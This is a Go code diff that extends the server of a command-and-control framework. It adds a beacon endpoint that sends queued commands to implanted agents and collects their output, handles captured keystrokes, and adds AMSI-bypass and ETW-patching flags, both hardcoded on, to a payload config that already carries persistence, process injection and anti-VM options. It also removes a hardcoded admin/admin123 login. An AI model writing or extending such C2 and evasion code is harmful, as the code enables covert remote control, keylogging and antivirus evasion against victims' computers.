@@ -40,6 +40,7 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	{
 		// Auth
 		api.POST("/auth/login", loginHandler)
+		api.POST("/auth/register", registerHandler)
 		api.POST("/auth/logout", logoutHandler)
 
 		// Agents
@@ -100,7 +101,7 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
 	// Separate from WebSocket /ws/agent used by the Rust Linux agent.
 	r.POST("/agent", agentHTTPBeaconHandler(agentMgr))
-	r.POST("/beacon", agentHTTPDataTaskHandler(agentMgr))
+	r.POST("/beacon", agentHTTPDataTaskHandler(agentMgr, taskQueue))
 
 	// Health on the public API port — Railway/Render hit this via $PORT.
 	r.GET("/health", func(c *gin.Context) {
@@ -115,13 +116,16 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	}
 }
 
-func agentHTTPDataTaskHandler(agentMgr *agent.Manager) gin.HandlerFunc {
+func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		var msg struct {
-			Type    string `json:"type"`
-			HwID    string `json:"hw_id"`
-			Data    string `json:"data"`
-			Title   string `json:"window_title"`
+			Type     string `json:"type"`
+			HwID     string `json:"hw_id"`
+			Data     string `json:"data"`
+			Title    string `json:"window_title"`
+			TaskID   string `json:"task_id"`
+			Code     int    `json:"code"`
+			Output   string `json:"output"`
 		}
 		if err := c.ShouldBindJSON(&msg); err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
@@ -135,7 +139,16 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager) gin.HandlerFunc {
 		agentMgr.UpdateLastSeen(a.ID)
 
 		switch msg.Type {
-		case "heartbeat":
+		case "result":
+			if taskQueue != nil && msg.TaskID != "" {
+				_ = taskQueue.UpdateResult(msg.TaskID, msg.Output, msg.Code)
+				status := "completed"
+				if msg.Code != 0 {
+					status = "failed"
+				}
+				_ = taskQueue.UpdateStatus(msg.TaskID, status)
+				taskQueue.HandleResult(msg.TaskID, msg.Output, msg.Code)
+			}
 			c.JSON(http.StatusOK, gin.H{"status": "ok"})
 			return
 		case "keystrokes":
@@ -152,34 +165,27 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager) gin.HandlerFunc {
 					}
 				}
 			}
-		default:
-			// unknown data type — accepted, ignored
 		}
-		c.JSON(http.StatusOK, gin.H{"status": "ok"})
-	}
-}
 
-func loginHandler(c *gin.Context) {
-	var req struct {
-		Username string `json:"username" binding:"required"`
-		Password string `json:"password" binding:"required"`
+		var pending []map[string]any
+		if taskQueue != nil {
+			tasks, err := taskQueue.GetPending(a.ID)
+			if err == nil {
+				for _, t := range tasks {
+					_ = taskQueue.UpdateStatus(t.ID, "sent")
+					pending = append(pending, map[string]any{
+						"id":      t.ID,
+						"command": t.Command,
+						"args":    t.Args,
+					})
+				}
+			}
+		}
+		if pending == nil {
+			pending = []map[string]any{}
+		}
+		c.JSON(http.StatusOK, gin.H{"status": "ok", "tasks": pending})
 	}
-	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
-		return
-	}
-
-	// TODO: Implement proper authentication
-	if req.Username == "admin" && (req.Password == "admin" || req.Password == "admin123") {
-		token := uuid.New().String()
-		c.JSON(http.StatusOK, gin.H{
-			"token": token,
-			"user":  gin.H{"username": req.Username},
-		})
-		return
-	}
-
-	c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
 }
 
 func logoutHandler(c *gin.Context) {
@@ -1061,7 +1067,7 @@ func marshalTrailer(cfg PayloadConfig) []byte {
 		inj = "none"
 	}
 	return []byte(fmt.Sprintf(
-		`{"c2_host":%s,"c2_port":%s,"use_tls":%s,"sleep_interval":%s,"jitter":%s,"persistence":%s,"hide_console":%s,"key":%s,"injection_method":%s,"anti_debug":%s,"anti_vm":%s,"sleep_obfuscation":%s}`,
+		`{"c2_host":%s,"c2_port":%s,"use_tls":%s,"sleep_interval":%s,"jitter":%s,"persistence":%s,"hide_console":%s,"key":%s,"injection_method":%s,"anti_debug":%s,"anti_vm":%s,"sleep_obfuscation":%s,"amsi_bypass":%s,"etw_patch":%s}`,
 		esc(cfg.C2Host),
 		esc(port),
 		esc(tf(cfg.UseTLS)),
@@ -1073,6 +1079,8 @@ func marshalTrailer(cfg PayloadConfig) []byte {
 		esc(inj),
 		esc(tf(cfg.AntiDebug)),
 		esc(tf(cfg.AntiVM)),
+		esc("true"),
+		esc("true"),
 		esc("true"),
 	))
 }
